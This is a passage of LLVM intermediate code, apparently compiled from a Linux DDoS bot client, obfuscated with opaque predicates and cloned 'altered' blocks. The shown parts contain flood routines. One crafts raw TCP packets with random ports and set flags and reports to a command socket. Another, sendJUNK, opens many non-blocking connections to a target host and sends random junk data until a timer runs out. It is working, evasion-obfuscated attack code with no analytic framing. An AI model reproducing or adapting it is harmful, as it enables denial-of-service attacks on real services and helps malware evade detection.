  %579 = icmp sgt i32 %577, %578
  %580 = load i32, i32* @x.73
  %581 = load i32, i32* @y.74
  %582 = sub i32 %580, 1
  %583 = mul i32 %580, %582
  %584 = urem i32 %583, 2
  %585 = icmp eq i32 %584, 0
  %586 = icmp slt i32 %581, 10
  %587 = or i1 %585, %586
  br i1 %587, label %originalBBpart282, label %originalBB80alteredBB

originalBBpart282:                                ; preds = %originalBB80
  br i1 %579, label %588, label %589

; <label>:588:                                    ; preds = %originalBBpart282
  br label %609

; <label>:589:                                    ; preds = %originalBBpart282
  store i32 0, i32* %25, align 4
  br label %521

; <label>:590:                                    ; preds = %522
  %591 = load i32, i32* @x.73
  %592 = load i32, i32* @y.74
  %593 = sub i32 %591, 1
  %594 = mul i32 %591, %593
  %595 = urem i32 %594, 2
  %596 = icmp eq i32 %595, 0
  %597 = icmp slt i32 %592, 10
  %598 = or i1 %596, %597
  br i1 %598, label %originalBB84, label %originalBB84alteredBB

originalBB84:                                     ; preds = %originalBB84alteredBB, %590
  %599 = load i32, i32* %25, align 4
  %600 = add i32 %599, 1
  store i32 %600, i32* %25, align 4
  %601 = load i32, i32* @x.73
  %602 = load i32, i32* @y.74
  %603 = sub i32 %601, 1
  %604 = mul i32 %601, %603
  %605 = urem i32 %604, 2
  %606 = icmp eq i32 %605, 0
  %607 = icmp slt i32 %602, 10
  %608 = or i1 %606, %607
  br i1 %608, label %originalBBpart296, label %originalBB84alteredBB

originalBBpart296:                                ; preds = %originalBB84
  br label %521

; <label>:609:                                    ; preds = %588
  %610 = load i32, i32* @x.73
  %611 = load i32, i32* @y.74
  %612 = sub i32 %610, 1
  %613 = mul i32 %610, %612
  %614 = urem i32 %613, 2
  %615 = icmp eq i32 %614, 0
  %616 = icmp slt i32 %611, 10
  %617 = or i1 %615, %616
  br i1 %617, label %originalBB98, label %originalBB98alteredBB

originalBB98:                                     ; preds = %originalBB98alteredBB, %609
  %618 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %618)
  %619 = load i32, i32* @x.73
  %620 = load i32, i32* @y.74
  %621 = sub i32 %619, 1
  %622 = mul i32 %619, %621
  %623 = urem i32 %622, 2
  %624 = icmp eq i32 %623, 0
  %625 = icmp slt i32 %620, 10
  %626 = or i1 %624, %625
  br i1 %626, label %originalBBpart2100, label %originalBB98alteredBB

originalBBpart2100:                               ; preds = %originalBB98
  br label %627

; <label>:627:                                    ; preds = %originalBBpart2100, %139, %originalBBpart216, %92
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %30
  %628 = call i32 @rand_cmwc()
  %629 = trunc i32 %628 to i16
  %630 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %629, i16* %630, align 2
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %50
  %631 = load i32, i32* %9, align 4
  %632 = trunc i32 %631 to i16
  %633 = call zeroext i16 @htons(i16 zeroext %632) #13
  %634 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %633, i16* %634, align 2
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %71
  %635 = load i8*, i8** %8, align 8
  %636 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %637 = call i32 @getHost(i8* %635, %struct.in_addr* %636)
  %638 = icmp ne i32 %637, 0
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %93
  %639 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %640 = getelementptr inbounds [8 x i8], [8 x i8]* %639, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %640, i8 0, i64 8, i32 4, i1 false)
  %641 = call i32 @socket(i32 2, i32 3, i32 6) #4
  store i32 %641, i32* %17, align 4
  %642 = load i32, i32* %17, align 4
  %643 = icmp ne i32 %642, 0
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %115
  %644 = load i32, i32* @mainCommSock, align 4
  %645 = call i32 (i32, i8*, ...) @sockprintf(i32 %644, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.37, i32 0, i32 0))
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %142
  %646 = load i32, i32* %11, align 4
  %647 = icmp eq i32 %646, 0
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %161
  store i32 0, i32* %19, align 4
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %267
  %648 = load i8*, i8** %12, align 8
  %649 = call i8* @strtok(i8* %648, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #4
  store i8* %649, i8** %23, align 8
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %289
  %650 = load i8*, i8** %23, align 8
  %651 = call i32 @strcmp(i8* %650, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.44, i32 0, i32 0)) #10
  %652 = icmp ne i32 %651, 0
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %309
  %653 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %654 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %653, i32 0, i32 0
  %655 = bitcast %union.anon.0* %654 to %struct.anon.1*
  %656 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %655, i32 0, i32 4
  %657 = load i16, i16* %656, align 4
  %_ = sub i16 0, %657
  %gen = add i16 %_, -513
  %_35 = sub i16 0, %657
  %gen36 = add i16 %_35, -513
  %658 = and i16 %657, -513
  %_37 = sub i16 0, %658
  %gen38 = add i16 %_37, 512
  %_39 = sub i16 0, %658
  %gen40 = add i16 %_39, 512
  %_41 = sub i16 %658, 512
  %gen42 = mul i16 %_41, 512
  %659 = or i16 %658, 512
  store i16 %659, i16* %656, align 4
  br label %originalBB34

originalBB46alteredBB:                            ; preds = %originalBB46, %337
  %660 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %661 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %660, i32 0, i32 0
  %662 = bitcast %union.anon.0* %661 to %struct.anon.1*
  %663 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %662, i32 0, i32 4
  %664 = load i16, i16* %663, align 4
  %_47 = sub i16 0, %664
  %gen48 = add i16 %_47, -1025
  %_49 = sub i16 0, %664
  %gen50 = add i16 %_49, -1025
  %_51 = shl i16 %664, -1025
  %665 = and i16 %664, -1025
  %_52 = sub i16 %665, 1024
  %gen53 = mul i16 %_52, 1024
  %_54 = shl i16 %665, 1024
  %_55 = sub i16 %665, 1024
  %gen56 = mul i16 %_55, 1024
  %_57 = sub i16 0, %665
  %gen58 = add i16 %_57, 1024
  %_59 = sub i16 0, %665
  %gen60 = add i16 %_59, 1024
  %666 = or i16 %665, 1024
  store i16 %666, i16* %663, align 4
  br label %originalBB46

originalBB64alteredBB:                            ; preds = %originalBB64, %373
  %667 = load i8*, i8** %23, align 8
  %668 = call i32 @strcmp(i8* %667, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.47, i32 0, i32 0)) #10
  %669 = icmp ne i32 %668, 0
  br label %originalBB64

originalBB68alteredBB:                            ; preds = %originalBB68, %419
  br label %originalBB68

originalBB72alteredBB:                            ; preds = %originalBB72, %440
  %670 = call i32 @rand_cmwc()
  %671 = trunc i32 %670 to i16
  %672 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %673 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %672, i32 0, i32 0
  %674 = bitcast %union.anon.0* %673 to %struct.anon.1*
  %675 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %674, i32 0, i32 5
  store i16 %671, i16* %675, align 2
  %676 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %677 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %676, i32 0, i32 0
  %678 = bitcast %union.anon.0* %677 to %struct.anon.1*
  %679 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %678, i32 0, i32 6
  store i16 0, i16* %679, align 4
  %680 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %681 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %680, i32 0, i32 0
  %682 = bitcast %union.anon.0* %681 to %struct.anon.1*
  %683 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %682, i32 0, i32 7
  store i16 0, i16* %683, align 2
  %684 = load i32, i32* %9, align 4
  %685 = icmp eq i32 %684, 0
  br label %originalBB72

originalBB76alteredBB:                            ; preds = %originalBB76, %475
  %686 = load i32, i32* %9, align 4
  %687 = trunc i32 %686 to i16
  %688 = call zeroext i16 @htons(i16 zeroext %687) #13
  %689 = zext i16 %688 to i32
  br label %originalBB76

originalBB80alteredBB:                            ; preds = %originalBB80, %568
  %690 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %691 = load i32, i32* %24, align 4
  %692 = icmp sgt i32 %690, %691
  br label %originalBB80

originalBB84alteredBB:                            ; preds = %originalBB84, %590
  %693 = load i32, i32* %25, align 4
  %_85 = sub i32 0, %693
  %gen86 = add i32 %_85, 1
  %_87 = sub i32 %693, 1
  %gen88 = mul i32 %_87, 1
  %_89 = sub i32 0, %693
  %gen90 = add i32 %_89, 1
  %_91 = sub i32 0, %693
  %gen92 = add i32 %_91, 1
  %_93 = sub i32 %693, 1
  %gen94 = mul i32 %_93, 1
  %694 = add i32 %693, 1
  store i32 %694, i32* %25, align 4
  br label %originalBB84

originalBB98alteredBB:                            ; preds = %originalBB98, %609
  %695 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %695)
  br label %originalBB98
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #2

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @sendJUNK(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i8*, align 8
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %20 = call i32 @getdtablesize() #4
  %21 = sdiv i32 %20, 2
  store i32 %21, i32* %7, align 4
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %22, align 4
  %23 = load i32, i32* %5, align 4
  %24 = trunc i32 %23 to i16
  %25 = call zeroext i16 @htons(i16 zeroext %24) #13
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %25, i16* %26, align 2
  %27 = load i8*, i8** %4, align 8
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %29 = call i32 @getHost(i8* %27, %struct.in_addr* %28)
  %30 = icmp ne i32 %29, 0
  br i1 %30, label %31, label %32

; <label>:31:                                     ; preds = %3
  br label %402

; <label>:32:                                     ; preds = %3
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 3
  %34 = getelementptr inbounds [8 x i8], [8 x i8]* %33, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %34, i8 0, i64 8, i32 4, i1 false)
  %35 = load i32, i32* %7, align 4
  %36 = zext i32 %35 to i64
  %37 = call i8* @llvm.stacksave()
  store i8* %37, i8** %10, align 8
  %38 = alloca %struct.state_t, i64 %36, align 16
  %39 = bitcast %struct.state_t* %38 to i8*
  %40 = load i32, i32* %7, align 4
  %41 = sext i32 %40 to i64
  %42 = mul i64 %41, 5
  call void @llvm.memset.p0i8.i64(i8* %39, i8 0, i64 %42, i32 16, i1 false)
  %43 = call noalias i8* @malloc(i64 1024) #4
  store i8* %43, i8** %16, align 8
  %44 = load i8*, i8** %16, align 8
  call void @llvm.memset.p0i8.i64(i8* %44, i8 0, i64 1024, i32 1, i1 false)
  %45 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %46 = load i32, i32* %6, align 4
  %47 = add nsw i32 %45, %46
  store i32 %47, i32* %17, align 4
  br label %48

; <label>:48:                                     ; preds = %383, %32
  %49 = load i32, i32* %17, align 4
  %50 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %51 = icmp sgt i32 %49, %50
  br i1 %51, label %52, label %384

; <label>:52:                                     ; preds = %48
  %53 = load i32, i32* @x.75
  %54 = load i32, i32* @y.76
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %52
  store i32 0, i32* %8, align 4
  %61 = load i32, i32* @x.75
  %62 = load i32, i32* @y.76
  %63 = sub i32 %61, 1
  %64 = mul i32 %61, %63
  %65 = urem i32 %64, 2
  %66 = icmp eq i32 %65, 0
  %67 = icmp slt i32 %62, 10
  %68 = or i1 %66, %67
  br i1 %68, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %69

; <label>:69:                                     ; preds = %originalBBpart276, %originalBBpart2
  %70 = load i32, i32* @x.75
  %71 = load i32, i32* @y.76
  %72 = sub i32 %70, 1
  %73 = mul i32 %70, %72
  %74 = urem i32 %73, 2
  %75 = icmp eq i32 %74, 0
  %76 = icmp slt i32 %71, 10
  %77 = or i1 %75, %76
  br i1 %77, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %69
  %78 = load i32, i32* %8, align 4
  %79 = load i32, i32* %7, align 4
  %80 = icmp slt i32 %78, %79
  %81 = load i32, i32* @x.75
  %82 = load i32, i32* @y.76
  %83 = sub i32 %81, 1
  %84 = mul i32 %81, %83
  %85 = urem i32 %84, 2
  %86 = icmp eq i32 %85, 0
  %87 = icmp slt i32 %82, 10
  %88 = or i1 %86, %87
  br i1 %88, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %80, label %89, label %383

; <label>:89:                                     ; preds = %originalBBpart24
  %90 = load i32, i32* %8, align 4
  %91 = sext i32 %90 to i64
  %92 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %91
  %93 = getelementptr inbounds %struct.state_t, %struct.state_t* %92, i32 0, i32 1
  %94 = load i8, i8* %93, align 4
  %95 = zext i8 %94 to i32
  switch i32 %95, label %363 [
    i32 0, label %96
    i32 1, label %188
    i32 2, label %337
  ]

; <label>:96:                                     ; preds = %89
  %97 = call i32 @socket(i32 2, i32 1, i32 0) #4
  %98 = load i32, i32* %8, align 4
  %99 = sext i32 %98 to i64
  %100 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %99
  %101 = getelementptr inbounds %struct.state_t, %struct.state_t* %100, i32 0, i32 0
  store i32 %97, i32* %101, align 8
  %102 = load i32, i32* %8, align 4
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %103
  %105 = getelementptr inbounds %struct.state_t, %struct.state_t* %104, i32 0, i32 0
  %106 = load i32, i32* %105, align 8
  %107 = load i32, i32* %8, align 4
  %108 = sext i32 %107 to i64
  %109 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %108
  %110 = getelementptr inbounds %struct.state_t, %struct.state_t* %109, i32 0, i32 0
  %111 = load i32, i32* %110, align 8
  %112 = call i32 (i32, i32, ...) @fcntl(i32 %111, i32 3, i8* null)
  %113 = or i32 %112, 2048
  %114 = call i32 (i32, i32, ...) @fcntl(i32 %106, i32 4, i32 %113)
  %115 = load i32, i32* %8, align 4
  %116 = sext i32 %115 to i64
  %117 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %116
  %118 = getelementptr inbounds %struct.state_t, %struct.state_t* %117, i32 0, i32 0
  %119 = load i32, i32* %118, align 8
  %120 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %121 = call i32 @connect(i32 %119, %struct.sockaddr* %120, i32 16)
  %122 = icmp ne i32 %121, -1
  br i1 %122, label %127, label %123

; <label>:123:                                    ; preds = %96
  %124 = call i32* @__errno_location() #13
  %125 = load i32, i32* %124, align 4
  %126 = icmp ne i32 %125, 115
  br i1 %126, label %127, label %150

; <label>:127:                                    ; preds = %123, %96
  %128 = load i32, i32* @x.75
  %129 = load i32, i32* @y.76
  %130 = sub i32 %128, 1
  %131 = mul i32 %128, %130
  %132 = urem i32 %131, 2
  %133 = icmp eq i32 %132, 0
  %134 = icmp slt i32 %129, 10
  %135 = or i1 %133, %134
  br i1 %135, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %127
  %136 = load i32, i32* %8, align 4
  %137 = sext i32 %136 to i64
  %138 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %137
  %139 = getelementptr inbounds %struct.state_t, %struct.state_t* %138, i32 0, i32 0
  %140 = load i32, i32* %139, align 8
  %141 = call i32 @close(i32 %140)
  %142 = load i32, i32* @x.75
  %143 = load i32, i32* @y.76
  %144 = sub i32 %142, 1
  %145 = mul i32 %142, %144
  %146 = urem i32 %145, 2
  %147 = icmp eq i32 %146, 0
  %148 = icmp slt i32 %143, 10
  %149 = or i1 %147, %148
  br i1 %149, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %171

; <label>:150:                                    ; preds = %123
  %151 = load i32, i32* @x.75
  %152 = load i32, i32* @y.76
  %153 = sub i32 %151, 1
  %154 = mul i32 %151, %153
  %155 = urem i32 %154, 2
  %156 = icmp eq i32 %155, 0
  %157 = icmp slt i32 %152, 10
  %158 = or i1 %156, %157
  br i1 %158, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %150
  %159 = load i32, i32* %8, align 4
  %160 = sext i32 %159 to i64
  %161 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %160
  %162 = getelementptr inbounds %struct.state_t, %struct.state_t* %161, i32 0, i32 1
  store i8 1, i8* %162, align 4
  %163 = load i32, i32* @x.75
  %164 = load i32, i32* @y.76
  %165 = sub i32 %163, 1
  %166 = mul i32 %163, %165
  %167 = urem i32 %166, 2
  %168 = icmp eq i32 %167, 0
  %169 = icmp slt i32 %164, 10
  %170 = or i1 %168, %169
  br i1 %170, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %171

; <label>:171:                                    ; preds = %originalBBpart212, %originalBBpart28
  %172 = load i32, i32* @x.75
  %173 = load i32, i32* @y.76
  %174 = sub i32 %172, 1
  %175 = mul i32 %172, %174
  %176 = urem i32 %175, 2
  %177 = icmp eq i32 %176, 0
  %178 = icmp slt i32 %173, 10
  %179 = or i1 %177, %178
  br i1 %179, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %171
  %180 = load i32, i32* @x.75
  %181 = load i32, i32* @y.76
  %182 = sub i32 %180, 1
  %183 = mul i32 %180, %182
  %184 = urem i32 %183, 2
  %185 = icmp eq i32 %184, 0
  %186 = icmp slt i32 %181, 10
  %187 = or i1 %185, %186
  br i1 %187, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %363

; <label>:188:                                    ; preds = %89
  br label %189

; <label>:189:                                    ; preds = %188
  %190 = load i32, i32* @x.75
  %191 = load i32, i32* @y.76
  %192 = sub i32 %190, 1
  %193 = mul i32 %190, %192
  %194 = urem i32 %193, 2
  %195 = icmp eq i32 %194, 0
  %196 = icmp slt i32 %191, 10
  %197 = or i1 %195, %196
  br i1 %197, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %189
  %198 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %199 = getelementptr inbounds [16 x i64], [16 x i64]* %198, i64 0, i64 0
  %200 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %199) #4, !srcloc !6
  %201 = extractvalue { i64, i64* } %200, 0
  %202 = extractvalue { i64, i64* } %200, 1
  %203 = trunc i64 %201 to i32
  store i32 %203, i32* %18, align 4
  %204 = ptrtoint i64* %202 to i64
  %205 = trunc i64 %204 to i32
  store i32 %205, i32* %19, align 4
  %206 = load i32, i32* @x.75
  %207 = load i32, i32* @y.76
  %208 = sub i32 %206, 1
  %209 = mul i32 %206, %208
  %210 = urem i32 %209, 2
  %211 = icmp eq i32 %210, 0
  %212 = icmp slt i32 %207, 10
  %213 = or i1 %211, %212
  br i1 %213, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %214

; <label>:214:                                    ; preds = %originalBBpart220
  br label %215

; <label>:215:                                    ; preds = %214
  %216 = load i32, i32* @x.75
  %217 = load i32, i32* @y.76
  %218 = sub i32 %216, 1
  %219 = mul i32 %216, %218
  %220 = urem i32 %219, 2
  %221 = icmp eq i32 %220, 0
  %222 = icmp slt i32 %217, 10
  %223 = or i1 %221, %222
  br i1 %223, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %215
  %224 = load i32, i32* %8, align 4
  %225 = sext i32 %224 to i64
  %226 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %225
  %227 = getelementptr inbounds %struct.state_t, %struct.state_t* %226, i32 0, i32 0
  %228 = load i32, i32* %227, align 8
  %229 = srem i32 %228, 64
  %230 = zext i32 %229 to i64
  %231 = shl i64 1, %230
  %232 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %233 = load i32, i32* %8, align 4
  %234 = sext i32 %233 to i64
  %235 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %234
  %236 = getelementptr inbounds %struct.state_t, %struct.state_t* %235, i32 0, i32 0
  %237 = load i32, i32* %236, align 8
  %238 = sdiv i32 %237, 64
  %239 = sext i32 %238 to i64
  %240 = getelementptr inbounds [16 x i64], [16 x i64]* %232, i64 0, i64 %239
  %241 = load i64, i64* %240, align 8
  %242 = or i64 %241, %231
  store i64 %242, i64* %240, align 8
  %243 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 0, i64* %243, align 8
  %244 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 10000, i64* %244, align 8
  %245 = load i32, i32* %8, align 4
  %246 = sext i32 %245 to i64
  %247 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %246
  %248 = getelementptr inbounds %struct.state_t, %struct.state_t* %247, i32 0, i32 0
  %249 = load i32, i32* %248, align 8
  %250 = add nsw i32 %249, 1
  %251 = call i32 @select(i32 %250, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  store i32 %251, i32* %15, align 4
  %252 = load i32, i32* %15, align 4
  %253 = icmp eq i32 %252, 1
  %254 = load i32, i32* @x.75
  %255 = load i32, i32* @y.76
  %256 = sub i32 %254, 1
  %257 = mul i32 %254, %256
  %258 = urem i32 %257, 2
  %259 = icmp eq i32 %258, 0
  %260 = icmp slt i32 %255, 10
  %261 = or i1 %259, %260
  br i1 %261, label %originalBBpart262, label %originalBB22alteredBB

originalBBpart262:                                ; preds = %originalBB22
  br i1 %253, label %262, label %289

; <label>:262:                                    ; preds = %originalBBpart262
  store i32 4, i32* %13, align 4
  %263 = load i32, i32* %8, align 4
  %264 = sext i32 %263 to i64
  %265 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %264
  %266 = getelementptr inbounds %struct.state_t, %struct.state_t* %265, i32 0, i32 0
  %267 = load i32, i32* %266, align 8
  %268 = bitcast i32* %14 to i8*
  %269 = call i32 @getsockopt(i32 %267, i32 1, i32 4, i8* %268, i32* %13) #4
  %270 = load i32, i32* %14, align 4
  %271 = icmp ne i32 %270, 0
  br i1 %271, label %272, label %283

; <label>:272:                                    ; preds = %262
  %273 = load i32, i32* %8, align 4
  %274 = sext i32 %273 to i64
  %275 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %274
  %276 = getelementptr inbounds %struct.state_t, %struct.state_t* %275, i32 0, i32 0
  %277 = load i32, i32* %276, align 8
  %278 = call i32 @close(i32 %277)
  %279 = load i32, i32* %8, align 4
  %280 = sext i32 %279 to i64
  %281 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %280
  %282 = getelementptr inbounds %struct.state_t, %struct.state_t* %281, i32 0, i32 1
  store i8 0, i8* %282, align 4
  br label %288

; <label>:283:                                    ; preds = %262
  %284 = load i32, i32* %8, align 4
  %285 = sext i32 %284 to i64
  %286 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %285
  %287 = getelementptr inbounds %struct.state_t, %struct.state_t* %286, i32 0, i32 1
  store i8 2, i8* %287, align 4
  br label %288

; <label>:288:                                    ; preds = %283, %272
  br label %320

; <label>:289:                                    ; preds = %originalBBpart262
  %290 = load i32, i32* %15, align 4
  %291 = icmp eq i32 %290, -1
  br i1 %291, label %292, label %319

; <label>:292:                                    ; preds = %289
  %293 = load i32, i32* @x.75
  %294 = load i32, i32* @y.76
  %295 = sub i32 %293, 1
  %296 = mul i32 %293, %295
  %297 = urem i32 %296, 2
  %298 = icmp eq i32 %297, 0
  %299 = icmp slt i32 %294, 10
  %300 = or i1 %298, %299
  br i1 %300, label %originalBB64, label %originalBB64alteredBB

originalBB64:                                     ; preds = %originalBB64alteredBB, %292
  %301 = load i32, i32* %8, align 4
  %302 = sext i32 %301 to i64
  %303 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %302
  %304 = getelementptr inbounds %struct.state_t, %struct.state_t* %303, i32 0, i32 0
  %305 = load i32, i32* %304, align 8
  %306 = call i32 @close(i32 %305)
  %307 = load i32, i32* %8, align 4
  %308 = sext i32 %307 to i64
  %309 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %308
  %310 = getelementptr inbounds %struct.state_t, %struct.state_t* %309, i32 0, i32 1
  store i8 0, i8* %310, align 4
  %311 = load i32, i32* @x.75
  %312 = load i32, i32* @y.76
  %313 = sub i32 %311, 1
  %314 = mul i32 %311, %313
  %315 = urem i32 %314, 2
  %316 = icmp eq i32 %315, 0
  %317 = icmp slt i32 %312, 10
  %318 = or i1 %316, %317
  br i1 %318, label %originalBBpart266, label %originalBB64alteredBB

originalBBpart266:                                ; preds = %originalBB64
  br label %319

; <label>:319:                                    ; preds = %originalBBpart266, %289
  br label %320

; <label>:320:                                    ; preds = %319, %288
  %321 = load i32, i32* @x.75
  %322 = load i32, i32* @y.76
  %323 = sub i32 %321, 1
  %324 = mul i32 %321, %323
  %325 = urem i32 %324, 2
  %326 = icmp eq i32 %325, 0
  %327 = icmp slt i32 %322, 10
  %328 = or i1 %326, %327
  br i1 %328, label %originalBB68, label %originalBB68alteredBB

originalBB68:                                     ; preds = %originalBB68alteredBB, %320
  %329 = load i32, i32* @x.75
  %330 = load i32, i32* @y.76
  %331 = sub i32 %329, 1
  %332 = mul i32 %329, %331
  %333 = urem i32 %332, 2
  %334 = icmp eq i32 %333, 0
  %335 = icmp slt i32 %330, 10
  %336 = or i1 %334, %335
  br i1 %336, label %originalBBpart270, label %originalBB68alteredBB

originalBBpart270:                                ; preds = %originalBB68
  br label %363

; <label>:337:                                    ; preds = %89
  %338 = load i8*, i8** %16, align 8
  call void @makeRandomStr(i8* %338, i32 1024)
  %339 = load i32, i32* %8, align 4
  %340 = sext i32 %339 to i64
  %341 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %340
  %342 = getelementptr inbounds %struct.state_t, %struct.state_t* %341, i32 0, i32 0
  %343 = load i32, i32* %342, align 8
  %344 = load i8*, i8** %16, align 8
  %345 = call i64 @send(i32 %343, i8* %344, i64 1024, i32 16384)
  %346 = icmp eq i64 %345, -1
  br i1 %346, label %347, label %362

; <label>:347:                                    ; preds = %337
  %348 = call i32* @__errno_location() #13
  %349 = load i32, i32* %348, align 4
  %350 = icmp ne i32 %349, 11
  br i1 %350, label %351, label %362

; <label>:351:                                    ; preds = %347
  %352 = load i32, i32* %8, align 4
  %353 = sext i32 %352 to i64
  %354 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %353
  %355 = getelementptr inbounds %struct.state_t, %struct.state_t* %354, i32 0, i32 0
  %356 = load i32, i32* %355, align 8
  %357 = call i32 @close(i32 %356)
  %358 = load i32, i32* %8, align 4
  %359 = sext i32 %358 to i64
  %360 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %359
  %361 = getelementptr inbounds %struct.state_t, %struct.state_t* %360, i32 0, i32 1
  store i8 0, i8* %361, align 4
  br label %362

; <label>:362:                                    ; preds = %351, %347, %337
  br label %363

; <label>:363:                                    ; preds = %362, %originalBBpart270, %originalBBpart216, %89
  br label %364

; <label>:364:                                    ; preds = %363
  %365 = load i32, i32* @x.75
